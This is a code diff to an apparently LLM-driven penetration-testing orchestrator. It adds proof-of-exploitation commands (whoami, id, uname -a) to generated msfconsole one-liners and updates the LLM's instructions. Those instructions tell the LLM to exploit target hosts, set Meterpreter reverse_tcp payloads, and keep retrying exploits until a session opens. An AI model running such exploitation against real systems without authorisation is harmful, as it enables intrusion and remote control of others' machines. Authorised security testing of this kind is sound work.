@@ -166,6 +166,26 @@ class HybridOrchestratorV2:
     # start ([:N]) threw away exactly the evidence the LLM needs to see (#1).
     _OUTPUT_TAIL = 2500
 
+    # Proof-of-exploitation commands run on the opened session, in order. Single
+    # source of truth for both the deterministic exploit-first path and the
+    # instructions given to the LLM, so every confirmed finding carries the same
+    # evidence: who we are, our full identity/groups, and the target's kernel.
+    _PROOF_COMMANDS = ("whoami", "id", "uname -a")
+
+    @classmethod
+    def _proof_clause(cls) -> str:
+        """`sessions -c` clause running each proof command.
+
+        One `sessions -c` per command, not a single chained string: msfconsole's
+        -x splits console commands on ';', so chaining would break. Multi-token
+        commands (e.g. 'uname -a') get single quotes, which pass through the
+        outer double-quoted -x verbatim with no escaping.
+        """
+        parts = []
+        for cmd in cls._PROOF_COMMANDS:
+            parts.append(f"sessions -c '{cmd}'" if " " in cmd else f"sessions -c {cmd}")
+        return "; ".join(parts)
+
     def _build_msf_command(self, module: str, payload: Optional[str], port: int) -> str:
         """Non-interactive, self-terminating msfconsole one-liner for a known module.
 
@@ -177,7 +197,7 @@ class HybridOrchestratorV2:
             opts += f"set PAYLOAD {payload}; "
         command = (
             f'msfconsole -q -x "use {module}; {opts}'
-            f'run -z; sessions -c id; exit -y"'
+            f'run -z; {self._proof_clause()}; exit -y"'
         )
         return self._with_lhost(command)
 
@@ -484,13 +504,13 @@ class HybridOrchestratorV2:
                     "- Prefer Metasploit or target-specific automated tools over raw .py/.rb exploitdb scripts.\n"  # noqa: E501
                     "- The command MUST be non-interactive and self-terminating: it must NEVER leave an open shell or console (that hangs the run).\n"  # noqa: E501
                     "- For Metasploit, use exactly this shape:\n"
-                    "  msfconsole -q -x \"use <module>; set RHOSTS <ip>; set RPORT <port>; <other options>; run -z; sessions -c id; exit -y\"\n"  # noqa: E501
+                    f"  msfconsole -q -x \"use <module>; set RHOSTS <ip>; set RPORT <port>; <other options>; run -z; {self._proof_clause()}; exit -y\"\n"  # noqa: E501
                     "    * 'run -z' opens the session in the background instead of dropping into an interactive shell.\n"  # noqa: E501
-                    "    * 'sessions -c id' proves exploitation by running a command on the opened session and printing its output.\n"  # noqa: E501
+                    f"    * the proof clause runs these commands, in order, on the opened session: {', '.join(self._PROOF_COMMANDS)}. Use one 'sessions -c' per command (msfconsole splits -x on ';'), and single-quote any multi-token command (e.g. sessions -c 'uname -a').\n"  # noqa: E501
                     "    * always finish with 'exit -y' so msfconsole quits.\n"
                     "- RETRY STRATEGY: If your first attempt fails (no session, timeout, or silent failure), try a DIFFERENT exploit from the known list or a DIFFERENT payload. Keep retrying with variants until success or all options exhausted. Do NOT give up after one failure.\n"  # noqa: E501
                     "- Do NOT guess or hardcode a payload name. Let Metasploit use the module's DEFAULT payload (always compatible). If the default is non-interactive (e.g. cmd/unix/reverse_netcat), prefer to set a Meterpreter payload instead (e.g. php/meterpreter/reverse_tcp, cmd/linux/http/x86/meterpreter, linux/x86/meterpreter) to ensure interactive shell support and reliable proof commands. Do not hardcode LHOST unless required; let Metasploit auto-detect the local interface.\n"  # noqa: E501
-                    "- Proof of exploitation: ALWAYS include a proof command (id, whoami, pwd, uname) in the sessions -c clause. If sessions -c fails silently, consider the exploit unconfirmed and try a different payload or approach on the next attempt.\n"  # noqa: E501
+                    f"- Proof of exploitation: ALWAYS run ALL of these proof commands in the sessions -c clause: {', '.join(self._PROOF_COMMANDS)}. If they fail silently, consider the exploit unconfirmed and try a different payload or approach on the next attempt.\n"  # noqa: E501
                 )
 
                 # Defensive parse (#3): an unparseable decision skips the port
